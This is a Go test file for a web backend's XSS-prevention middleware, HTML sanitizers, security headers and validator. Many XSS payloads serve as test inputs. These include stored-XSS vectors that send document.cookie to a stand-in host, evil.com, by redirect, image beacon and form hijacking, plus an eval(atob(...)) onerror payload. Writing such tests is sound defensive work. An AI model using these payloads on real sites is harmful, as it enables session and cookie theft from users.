package security_test

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/gin-gonic/gin"
	"github.com/stretchr/testify/assert"

	"github.com/mimi6060/festivals/backend/internal/middleware"
	"github.com/mimi6060/festivals/backend/internal/pkg/security"
)

// ============================================================================
// XSS Prevention Middleware Tests
// ============================================================================

func setupXSSTestRouter() *gin.Engine {
	gin.SetMode(gin.TestMode)
	router := gin.New()
	router.Use(middleware.XSSPrevention())

	router.GET("/search", func(c *gin.Context) {
		query := c.Query("q")
		c.JSON(http.StatusOK, gin.H{"query": query})
	})

	router.POST("/comment", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"status": "ok"})
	})

	router.GET("/profile/:username", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"username": c.Param("username")})
	})

	return router
}

func TestXSSInQueryParams(t *testing.T) {
	router := setupXSSTestRouter()

	testCases := []struct {
		name    string
		param   string
		blocked bool
	}{
		// Script tags
		{"Basic script tag", "<script>alert(1)</script>", true},
		{"Script with src", "<script src='http://evil.com/xss.js'></script>", true},
		{"Script uppercase", "<SCRIPT>alert(1)</SCRIPT>", true},
		{"Script with spaces", "< script >alert(1)</ script >", true},

		// Event handlers
		{"onclick handler", "<img onclick='alert(1)'>", true},
		{"onerror handler", "<img src=x onerror='alert(1)'>", true},
		{"onload handler", "<body onload='alert(1)'>", true},
		{"onmouseover handler", "<div onmouseover='alert(1)'>hover</div>", true},
		{"onfocus handler", "<input onfocus='alert(1)' autofocus>", true},

		// JavaScript URLs
		{"javascript: URL", "<a href='javascript:alert(1)'>click</a>", true},
		{"javascript: with spaces", "<a href='javascript : alert(1)'>click</a>", true},
		{"vbscript: URL", "<a href='vbscript:msgbox(1)'>click</a>", true},

		// Data URLs
		{"data: text/html", "<a href='data:text/html,<script>alert(1)</script>'>", true},
		{"data: application/javascript", "<a href='data:application/javascript,alert(1)'>", true},

		// Dangerous tags
		{"iframe tag", "<iframe src='http://evil.com'>", true},
		{"embed tag", "<embed src='http://evil.com/flash.swf'>", true},
		{"object tag", "<object data='http://evil.com'>", true},
		{"form tag", "<form action='http://evil.com'>", true},

		// SVG XSS
		{"SVG with onclick", "<svg onclick='alert(1)'>", true},
		{"SVG with onload", "<svg onload='alert(1)'>", true},

		// CSS expression
		{"CSS expression", "<div style='width:expression(alert(1))'>", true},

		// Template injection
		{"Angular template", "{{constructor.constructor('alert(1)')()}}", true},
		{"ES6 template", "${alert(1)}", true},

		// Encoded attacks
		{"HTML entity script", "&#60;script&#62;alert(1)&#60;/script&#62;", false}, // Will be decoded by browser
		{"Unicode escape", "\u003cscript\u003ealert(1)\u003c/script\u003e", false},

		// Safe inputs
		{"Normal text", "Hello, World!", false},
		{"HTML entities (text)", "5 &lt; 10 &amp; 10 &gt; 5", false},
		{"URL", "https://example.com/page?param=value", false},
		{"Email", "user@example.com", false},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", "/search?q="+tc.param, nil)
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.blocked {
				assert.Equal(t, http.StatusForbidden, w.Code, "Expected XSS to be blocked: %s", tc.param)
			} else {
				assert.Equal(t, http.StatusOK, w.Code, "Expected safe input to pass: %s", tc.param)
			}
		})
	}
}

func TestXSSInRequestBody(t *testing.T) {
	router := setupXSSTestRouter()

	testCases := []struct {
		name    string
		body    map[string]interface{}
		blocked bool
	}{
		{
			name:    "Script in comment field",
			body:    map[string]interface{}{"comment": "<script>alert(document.cookie)</script>"},
			blocked: true,
		},
		{
			name:    "Event handler in name",
			body:    map[string]interface{}{"name": "<img src=x onerror=alert(1)>"},
			blocked: true,
		},
		{
			name:    "Nested XSS",
			body:    map[string]interface{}{"user": map[string]string{"bio": "<script>alert(1)</script>"}},
			blocked: true,
		},
		{
			name:    "XSS in array",
			body:    map[string]interface{}{"tags": []string{"safe", "<script>evil</script>", "tag"}},
			blocked: true,
		},
		{
			name:    "Clean comment",
			body:    map[string]interface{}{"comment": "This is a great product!"},
			blocked: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			body, _ := json.Marshal(tc.body)
			req := httptest.NewRequest("POST", "/comment", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.blocked {
				assert.Equal(t, http.StatusForbidden, w.Code)
			} else {
				assert.Equal(t, http.StatusOK, w.Code)
			}
		})
	}
}

func TestXSSInURLPath(t *testing.T) {
	router := setupXSSTestRouter()

	testCases := []struct {
		name    string
		path    string
		blocked bool
	}{
		{"Script in path", "/profile/<script>alert(1)</script>", true},
		{"Event handler in path", "/profile/user<img onerror=alert(1)>", true},
		{"Normal username", "/profile/john_doe", false},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", tc.path, nil)
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.blocked {
				assert.Equal(t, http.StatusForbidden, w.Code)
			} else {
				assert.Equal(t, http.StatusOK, w.Code)
			}
		})
	}
}

// ============================================================================
// Sanitizer Tests
// ============================================================================

func TestSanitizerStripAllHTML(t *testing.T) {
	sanitizer := security.DefaultSanitizer()

	testCases := []struct {
		input    string
		expected string
	}{
		{
			input:    "<script>alert(1)</script>Hello",
			expected: "&lt;script&gt;alert(1)&lt;/script&gt;Hello",
		},
		{
			input:    "<p>Paragraph</p>",
			expected: "&lt;p&gt;Paragraph&lt;/p&gt;",
		},
		{
			input:    "Normal text without HTML",
			expected: "Normal text without HTML",
		},
		{
			input:    "<img src=x onerror=alert(1)>",
			expected: "&lt;img src=x onerror=alert(1)&gt;",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.input, func(t *testing.T) {
			result := sanitizer.SanitizeString(tc.input)
			assert.Equal(t, tc.expected, result)
		})
	}
}

func TestSanitizerRichText(t *testing.T) {
	sanitizer := security.RichTextSanitizer()

	testCases := []struct {
		name     string
		input    string
		contains []string
		blocked  []string
	}{
		{
			name:     "Allow basic formatting",
			input:    "<p>Hello <b>World</b></p>",
			contains: []string{"<p>", "<b>", "</b>", "</p>"},
			blocked:  []string{},
		},
		{
			name:     "Block script tags",
			input:    "<p>Hello</p><script>alert(1)</script>",
			contains: []string{"<p>"},
			blocked:  []string{"<script>", "alert(1)"},
		},
		{
			name:     "Block event handlers",
			input:    "<p onclick='alert(1)'>Hello</p>",
			contains: []string{"<p>", "Hello"},
			blocked:  []string{"onclick"},
		},
		{
			name:     "Block iframe",
			input:    "<p>Text</p><iframe src='evil.com'></iframe>",
			contains: []string{"<p>"},
			blocked:  []string{"<iframe"},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := sanitizer.SanitizeHTML(tc.input)

			for _, expected := range tc.contains {
				assert.Contains(t, result, expected, "Should contain: %s", expected)
			}

			for _, blocked := range tc.blocked {
				assert.NotContains(t, result, blocked, "Should not contain: %s", blocked)
			}
		})
	}
}

func TestSanitizerRemoveJavaScriptURLs(t *testing.T) {
	sanitizer := security.RichTextSanitizer()

	testCases := []struct {
		input    string
		expected string
	}{
		{
			input: "<a href='javascript:alert(1)'>Click</a>",
			// javascript: should be removed
		},
		{
			input: "<a href='vbscript:msgbox(1)'>Click</a>",
			// vbscript: should be removed
		},
	}

	for _, tc := range testCases {
		t.Run(tc.input, func(t *testing.T) {
			result := sanitizer.SanitizeHTML(tc.input)
			assert.NotContains(t, result, "javascript:")
			assert.NotContains(t, result, "vbscript:")
		})
	}
}

// ============================================================================
// Security Header Tests
// ============================================================================

func TestSecurityHeadersXSSProtection(t *testing.T) {
	gin.SetMode(gin.TestMode)
	router := gin.New()

	cfg := middleware.DefaultSecurityConfig()
	router.Use(middleware.SecurityHeaders(cfg))

	router.GET("/test", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"status": "ok"})
	})

	req := httptest.NewRequest("GET", "/test", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	// Check X-XSS-Protection header
	xssProtection := w.Header().Get("X-XSS-Protection")
	assert.Equal(t, "1; mode=block", xssProtection)

	// Check Content-Security-Policy header
	csp := w.Header().Get("Content-Security-Policy")
	assert.NotEmpty(t, csp)
	assert.Contains(t, csp, "default-src")

	// Check X-Content-Type-Options
	contentTypeOptions := w.Header().Get("X-Content-Type-Options")
	assert.Equal(t, "nosniff", contentTypeOptions)
}

// ============================================================================
// Reflected XSS Tests
// ============================================================================

func TestReflectedXSSPatterns(t *testing.T) {
	router := setupXSSTestRouter()

	// Test various reflected XSS payloads from real-world attacks
	payloads := []string{
		`"><script>alert(String.fromCharCode(88,83,83))</script>`,
		`<img src=1 href=1 onerror="javascript:alert(1)">`,
		`<audio src=1 href=1 onerror="javascript:alert(1)">`,
		`<video src=1 href=1 onerror="javascript:alert(1)">`,
		`<body background="javascript:alert(1)">`,
		`<link rel="import" href="data:text/html,<script>alert(1)</script>">`,
		`<table background="javascript:alert(1)">`,
		`<div style="background-image:url(javascript:alert(1))">`,
		`<div style="width:expression(alert(1))">`,
		`<math><maction actiontype="statusline#http://evil.com" xlink:href="javascript:alert(1)">click</maction></math>`,
	}

	for _, payload := range payloads {
		t.Run("Payload", func(t *testing.T) {
			req := httptest.NewRequest("GET", "/search?q="+payload, nil)
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			// All payloads should be blocked
			assert.Equal(t, http.StatusForbidden, w.Code, "Expected XSS payload to be blocked: %s", payload)
		})
	}
}

// ============================================================================
// Stored XSS Prevention Tests
// ============================================================================

func TestStoredXSSPrevention(t *testing.T) {
	// Test that the sanitizer properly handles various stored XSS vectors
	sanitizer := security.DefaultSanitizer()

	storedXSSVectors := []struct {
		name  string
		input string
	}{
		{"Persistent script", "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"},
		{"Image beacon", "<img src='http://evil.com/log?data='+document.cookie>"},
		{"Form hijacking", "<form action='http://evil.com/steal'><input name='data'></form>"},
		{"Event handler persistence", "<div onmouseover='new Image().src=\"http://evil.com/?\"+document.cookie'>hover here</div>"},
	}

	for _, tc := range storedXSSVectors {
		t.Run(tc.name, func(t *testing.T) {
			result := sanitizer.SanitizeString(tc.input)

			// Verify dangerous content is escaped or removed
			assert.NotContains(t, result, "<script>")
			assert.NotContains(t, result, "onmouseover")
			assert.NotContains(t, result, "onerror")
			assert.NotContains(t, result, "javascript:")
		})
	}
}

// ============================================================================
// DOM-based XSS Prevention Tests
// ============================================================================

func TestDOMBasedXSSPatterns(t *testing.T) {
	router := setupXSSTestRouter()

	// DOM-based XSS patterns that could be executed client-side
	domXSSPatterns := []string{
		`#<script>alert(1)</script>`,
		`javascript:alert(document.domain)`,
		`data:text/html,<script>alert(1)</script>`,
		`<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`,
	}

	for _, pattern := range domXSSPatterns {
		t.Run("DOM XSS", func(t *testing.T) {
			req := httptest.NewRequest("GET", "/search?q="+pattern, nil)
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			assert.Equal(t, http.StatusForbidden, w.Code, "Expected DOM XSS pattern to be blocked: %s", pattern)
		})
	}
}

// ============================================================================
// Validator XSS Tests
// ============================================================================

func TestValidatorStringWithHTML(t *testing.T) {
	validator := security.DefaultValidator()

	testCases := []struct {
		input     string
		allowHTML bool
		valid     bool
	}{
		{"<script>alert(1)</script>", false, false},
		{"<p>Hello</p>", false, false},
		{"Hello World", false, true},
		{"<script>alert(1)</script>", true, true}, // HTML allowed
		{"<p>Hello</p>", true, true},              // HTML allowed
	}

	for _, tc := range testCases {
		t.Run(tc.input, func(t *testing.T) {
			result := validator.ValidateString(tc.input, 0, 1000, tc.allowHTML)
			assert.Equal(t, tc.valid, result.Valid)
		})
	}
}

// ============================================================================
// Benchmark Tests
// ============================================================================

func BenchmarkXSSDetection(b *testing.B) {
	router := setupXSSTestRouter()
	req := httptest.NewRequest("GET", "/search?q=normal+search+text", nil)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		w := httptest.NewRecorder()
		router.ServeHTTP(w, req)
	}
}

func BenchmarkXSSDetectionWithAttack(b *testing.B) {
	router := setupXSSTestRouter()
	req := httptest.NewRequest("GET", "/search?q=<script>alert(1)</script>", nil)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		w := httptest.NewRecorder()
		router.ServeHTTP(w, req)
	}
}

func BenchmarkSanitizerString(b *testing.B) {
	sanitizer := security.DefaultSanitizer()
	input := "<script>alert(1)</script>Hello World<img src=x onerror=alert(1)>"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		sanitizer.SanitizeString(input)
	}
}

func BenchmarkSanitizerHTML(b *testing.B) {
	sanitizer := security.RichTextSanitizer()
	input := "<p>Hello <b>World</b></p><script>alert(1)</script><div onclick='evil()'>test</div>"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		sanitizer.SanitizeHTML(input)
	}
}
